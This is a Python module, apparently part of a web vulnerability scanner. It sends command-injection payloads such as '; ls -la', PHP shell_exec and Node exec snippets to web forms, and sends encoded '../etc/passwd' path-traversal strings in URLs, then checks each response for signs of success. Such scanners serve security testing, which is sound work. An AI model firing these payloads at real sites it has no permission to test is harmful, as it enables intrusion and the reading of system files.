import time
from itertools import product
from typing import List, Tuple, Any

from tqdm import tqdm

PAYLOADS = {
    # Bash / SH
    "; ls -la",
    "& ls -la",
    "&& ls -la",
    "| ls -la",
    "|| ls -la",
    # Bash
    "ls -la",
    # php
    "<?php echo shell_exec('ls -l')?>",

    # Python
    "import os; print(os.popen('ls -la').read())",
    # JavaScript (Node.js)
    "const { exec } = require('child_process'); exec('ls -la', (error, stdout, stderr) => { if (error) { console.error(`exec error: ${error}`); return; } console.log(`stdout: ${stdout}`); });",
    # Ruby
    "puts `ls -la`",
    # Java
    "Process p = Runtime.getRuntime().exec('ls -la'); BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream())); String line = null; while ((line = in.readLine()) != null) { System.out.println(line); }",
    # Perl
    "print `ls -la`",
    # C#
    "using System; using System.Diagnostics; class Program { static void Main() { ProcessStartInfo startInfo = new ProcessStartInfo() { FileName = '/bin/bash', Arguments = '-c ls -la', RedirectStandardOutput = true }; Process process = new Process() { StartInfo = startInfo, }; process.Start(); string output = process.StandardOutput.ReadToEnd(); Console.WriteLine(output); } }",
    # Go
    "package main; import ( 'os/exec' 'fmt' ); func main() { out, err := exec.Command('ls', '-la').Output(); if err != nil { fmt.Printf('%s', err) } output := string(out[:]); fmt.Println(output) }",
    # Rust
    "use std::process::Command; fn main() { let output = Command::new('ls').arg('-la').output().expect('Failed to execute command'); println!({}, String::from_utf8_lossy(&output.stdout)); }",
    # Swift
    "import Foundation; let task = Process(); task.launchPath = '/bin/ls'; task.arguments = ['-la']; let pipe = Pipe(); task.standardOutput = pipe; task.launch(); let data = pipe.fileHandleForReading.readDataToEndOfFile(); let output = String(data: data, encoding: .utf8); print(output ?? '')",

    "\n/bin/ls -al\n",
    '\n/bin/ls -al\n',
    "|/bin/ls -al",

    "eval('ls')",
    "exec('ls')",
    "|/bin/ls -al",

    # Windows
    "& dir",
    # Windows PowerShell
    "ls",
    "dir"
}

ANSWERS = {"total",
           "root",
           "permission",
           "Directory of"}

PAYLOADS_LINK = {
    "../../../../../../../../../etc/passwd",
    "...//....//....//....//....//....//....//etc/passwd",
    "..././.././.././.././.././.././etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2fetc/passwd",
    "%2e%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2fetc/passwd",
}

PREFIXES = {"?name=",
            "?query=",
            "?q=",
            "?search=",
            "?search_text=",
            "?s=",
            "?s=",
            "?test=",
            "?keywords=",
            "?view=",
            "?post=",
            "?file=",
            }


def test_command_execution_in_form(self, form: str, url: str, level: list[str], req_per_minute: int) -> List[
    Tuple[bool, str]]:
    """
    Test for command execution vulnerabilities in a web form.

    This function submits various payloads that could potentially execute shell commands on a server
    if the input is not properly sanitized. After each submission, it checks the response for a specified prefix.
    If the prefix is found in the response, the corresponding payload is added to the results.

    Args:
        form (str): The web form to test.
        url (str): The URL to submit the form to.

    Returns:
        List[Tuple[bool, str]]: A list of tuples. Each tuple contains a boolean indicating whether the prefix was found in the response,
                                 and the payload that was used.
    """

    results = []
    progress_bar = tqdm(product(ANSWERS, PAYLOADS), total=len(ANSWERS) * len(PAYLOADS),
                        bar_format="{l_bar}%s{bar}%s{r_bar}" % ('\033[96m Payloads testing --> ', ''))

    for answer, payload in progress_bar:
        # Check payload without escaping characters
        response = self.submit_form(form=form, value=payload, url=url)
        self.request_count += 1

        if not response.ok:
            self.logger.warning(f"\n{url} = {response.status_code}, {payload}")
            # continue

        if answer in response.text:
            results.append((True, payload))

        # Check payload with escaping characters
        escaped_payload = payload.replace(" ", "%20")
        response = self.submit_form(form=form, value=escaped_payload, url=url)
        self.request_count += 1

        if not response.ok:
            self.logger.warning(f"\n{url} = {response.status_code}, {payload}")
            # continue

        if answer in response.text:
            results.append((True, escaped_payload))

        if level == "easy" and any(result[0] for result in results):
            break

        if req_per_minute is not None:
            pause = 60.0 / req_per_minute
            time.sleep(pause)

    return results


def test_command_in_link(self, url: str, level: list[str], req_per_minute: int) -> list[tuple[bool, Any]]:
    results = []
    progress_bar = tqdm(product(PAYLOADS_LINK, ANSWERS), total=len(PAYLOADS_LINK) * len(ANSWERS),
                        bar_format="{l_bar}%s{bar}%s{r_bar}" % ('\033[96m Payloads testing --> ', ''))

    for payload, answer in progress_bar:
        response = self.session.get(url=f"{url}{payload}")
        self.request_count += 1

        if not response.ok:
            # self.logger.warning(f"\n{url}{payload} | status_code={response.status_code}")
            continue

        if answer in response.text:
            results.append((True, payload))

        if level == "easy" and any(result[0] for result in results):
            break

        if req_per_minute is not None:
            pause = 60.0 / req_per_minute
            time.sleep(pause)

    return results
